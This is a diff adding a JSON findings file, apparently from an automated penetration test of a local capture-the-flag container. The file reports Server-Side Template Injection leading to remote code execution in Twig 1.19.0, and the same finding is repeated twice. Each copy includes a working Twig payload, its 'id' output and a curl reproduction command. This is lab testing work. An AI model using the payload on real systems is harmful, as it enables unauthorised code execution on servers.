@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T08:35:50.871297+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "832534da-e787-4a4e-86db-b0604f50a442",
+      "timestamp": "2026-04-15T08:35:50.871179+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Twig 1.19.0 with Remote Code Execution",
+      "severity": "critical",
+      "target": "http://172.17.0.1:51065",
+      "description": "The PHP application at /var/www/html/index.php passes user-supplied input (POST parameter 'name') directly into Twig's render() method after only applying htmlspecialchars(). Since htmlspecialchars() escapes HTML but does not prevent template syntax injection, an attacker can inject Twig template expressions. Twig 1.19.0 is vulnerable to SSTI via the _self.env.registerUndefinedFilterCallback() method, which allows registering arbitrary PHP functions as filters. By registering 'exec' or 'passthru' as a callback and then invoking it via getFilter(), an attacker achieves remote code execution as www-data.",
+      "evidence": "SSTI confirmed: {{7*7}} returned '49 is in stock!'. RCE confirmed: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}} returned 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'. The /flag.txt file exists but contains only a newline (1 byte), indicating the Docker build arg FLAG was empty at build time. The flag was intended to be written via 'RUN echo $FLAG > /flag.txt' in the Dockerfile.",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:51065 -d 'name={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}'",
+        "expected": "Response contains 'uid=33(www-data)' confirming RCE"
+      }
+    },
+    {
+      "id": "ba9acbab-35cc-4c28-af91-3085169c78d3",
+      "timestamp": "2026-04-15T08:35:50.919703+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Twig 1.19.0 with Remote Code Execution",
+      "severity": "critical",
+      "target": "http://172.17.0.1:51065",
+      "description": "The PHP application at /var/www/html/index.php passes user-supplied input (POST parameter 'name') directly into Twig's render() method after only applying htmlspecialchars(). Since htmlspecialchars() escapes HTML but does not prevent template syntax injection, an attacker can inject Twig template expressions. Twig 1.19.0 is vulnerable to SSTI via the _self.env.registerUndefinedFilterCallback() method, which allows registering arbitrary PHP functions as filters. By registering 'exec' or 'passthru' as a callback and then invoking it via getFilter(), an attacker achieves remote code execution as www-data.",
+      "evidence": "SSTI confirmed: {{7*7}} returned '49 is in stock!'. RCE confirmed: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}} returned 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'. The /flag.txt file exists but contains only a newline (1 byte), indicating the Docker build arg FLAG was empty at build time. The flag was intended to be written via 'RUN echo $FLAG > /flag.txt' in the Dockerfile.",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:51065 -d 'name={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}'",
+        "expected": "Response contains 'uid=33(www-data)' confirming RCE"
+      }
+    }
+  ],
+  "diagrams": []
+}
